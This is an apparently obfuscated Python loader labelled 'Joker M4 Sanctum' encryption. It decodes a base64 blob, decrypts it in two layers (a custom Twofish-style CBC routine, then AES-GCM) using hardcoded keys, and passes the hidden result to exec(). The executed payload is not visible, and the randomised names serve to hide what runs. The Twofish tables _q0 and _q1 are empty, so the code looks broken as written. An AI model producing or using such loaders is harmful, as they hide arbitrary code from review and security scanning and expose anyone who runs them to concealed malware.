# Protected by 𝓙𝓸𝓴𝓮𝓻丨𝓜4 Sanctum — Multi-Layer Encryption Engine
# Algorithms: aes, twofish
import base64 as JsOmNVZJ
import hashlib as JsaRZUIc
def _rotl32(x,n): return ((x<<n)|(x>>(32-n)))&0xffffffff
def _rotr32(x,n): return ((x>>n)|(x<<(32-n)))&0xffffffff

import hashlib
class _Tf:
 _q0=[]
 _q1=[]
 _MDS=[[0x01,0xEF,0x5B,0x5B],[0x5B,0xEF,0xEF,0x01],[0xEF,0x5B,0x01,0xEF],[0xEF,0x01,0xEF,0x5B]]
 @staticmethod
 def _gm(a,b):
  p=0
  for _ in range(8):
   if b&1:p^=a
   hi=a&0x80;a=(a<<1)&0xff
   if hi:a^=0x14d
   b>>=1
  return p
 @staticmethod
 def _ks(key):
  k=hashlib.sha256(key if len(key)==32 else hashlib.sha256(key).digest()).digest()
  buf=b''
  for _ in range(60):
   buf+=hashlib.sha256(k+len(buf).to_bytes(4,'little')).digest()
  sk=[int.from_bytes(buf[i*4:(i+1)*4],'little')for i in range(4)]
  rk=[int.from_bytes(buf[(4+i)*4:(5+i)*4],'little')for i in range(40)]
  return sk,rk
 @staticmethod
 def _g(x,i,sk):
  b=[(x>>j)&0xff for j in(0,8,16,24)]
  p=[_Tf._q0[b[0]],_Tf._q1[b[1]],_Tf._q0[b[2]],_Tf._q1[b[3]]]
  for j in range(4):p[j]^=(sk[(i+j)%4]>>(j*8))&0xff
  o=[0]*4
  for r in range(4):
   for c in range(4):o[r]^=_Tf._gm(_Tf._MDS[r][c],p[c])
  return (o[0]|(o[1]<<8)|(o[2]<<16)|(o[3]<<24))&0xffffffff
 @staticmethod
 def _db(key,block):
  sk,rk=_Tf._ks(key)
  w=[int.from_bytes(block[4*j:4*j+4],'little')for j in range(4)]
  for j in range(4):w[j]^=rk[4+j]
  for r in range(15,-1,-1):
   if r<15:w[0],w[1],w[2],w[3]=w[2],w[3],w[0],w[1]
   t0=_Tf._g(w[0],2*r,sk)
   t1=_Tf._g(_rotl32(w[1],8),2*r+1,sk)
   t0=(t0+2*t1+rk[4+2*r])&0xffffffff
   t1=(2*t0+t1+rk[4+2*r+1])&0xffffffff
   w[2]=_rotl32(w[2],1)^t0
   w[3]=_rotr32(w[3]^t1,1)
  for j in range(4):w[j]^=rk[j]
  return b''.join(w[j].to_bytes(4,'little')for j in range(4))
 @staticmethod
 def dec_cbc(key,data,iv):
  out=b''
  prev=iv
  for i in range(0,len(data),16):
   blk=data[i:i+16]
   dec=_Tf._db(key,blk)
   out+=bytes(a^b for a,b in zip(dec,prev))
   prev=blk
  pad=out[-1]
  return out[:-pad]

JsJbDoMg = "PKGFhsbs/ZiqIQgUQJrT/I8bAGAbZ0LpmbqHPYUGJGTtXdqxAodldSfJep6A2kye"\
    "/b9oPQf41wqrK4PFYcuFPWrCduSEBSLBTIyZeAV7++RUydFzpCzKp1GjVaw/qGd3"\
    "jqGbaVJUQ0J/GcvbmVQn+T7iwKhvxHK/do8RhvFz/gjbIvUBPjVfmz9aJs25TpZo"\
    "M3o8VPszzZjAU06IM5qDd87yYwJPEllUxxx7QuXwfUKJxH3P2u8CkPzpkCFW+0Uq"\
    "U9dyIHCfZDtbLF1jTkSi08FUGJwaG03vgfCFeOJzbKghb/KklR9u4FUCJ1gAqKQS"\
    "zhgKwojL/jfKORslo5z3wKTEreKNpb0djjyIeELGYTfJvAi45D75qMkhHBitDpxM"\
    "oZySfLMs1gNxzWyOq9INkvvbXkqnzUfTDshHOKLkujW+MfYJcjlqQYBnAYrn8VUi"\
    "gyqYs/mASuwWFoPpT5SyXR62wbZGpbbp7AsvF847oPyOTFo7AQncnrYTrTHD6kUw"\
    "8DmMF0TF9QMDARoVl8DpJrGx35LPifohyYCm8dUF6TZrxgPZtMxDRFTyYE4uAqbl"\
    "7ndIK8dx11CIk2trlfy9ipdq63yO+2uWmHFUnrUZWHugzouXae5moOj7W4wPDyEo"\
    "Ff1ARYUR5vsq3w7v8eMpW0fCOH40NwWPNrmE5x8UdwQ="
JsYLcRQY = JsOmNVZJ.b64decode(JsJbDoMg)
JsvFeBwY = JsOmNVZJ.b64decode("AZcKSu5ib9AX5HrIalG+978CfgJBAmFWyoSw+BdyGVQ=")
JsrunplW = JsYLcRQY[:16]
JsVaocMa = JsYLcRQY[16:]
JsYLcRQY = _Tf.dec_cbc(JsvFeBwY, JsVaocMa, JsrunplW)
from Crypto.Cipher import AES as _A_1
JspTZEbw = JsYLcRQY
JsmkVrMx = JsOmNVZJ.b64decode(JspTZEbw)
JsodYaJG = JsOmNVZJ.b64decode("i4UfVor+ukR3YIUu1NTkjrfEN0RczUB/D9bWg3jG+Rk=")
_n_1 = JsmkVrMx[:12]
_c_1 = JsmkVrMx[12:-16]
_t_1 = JsmkVrMx[-16:]
_d_1 = _A_1.new(JsodYaJG, _A_1.MODE_GCM, nonce=_n_1)
JsmkVrMx = _d_1.decrypt_and_verify(_c_1, _t_1)
exec(JsmkVrMx.decode())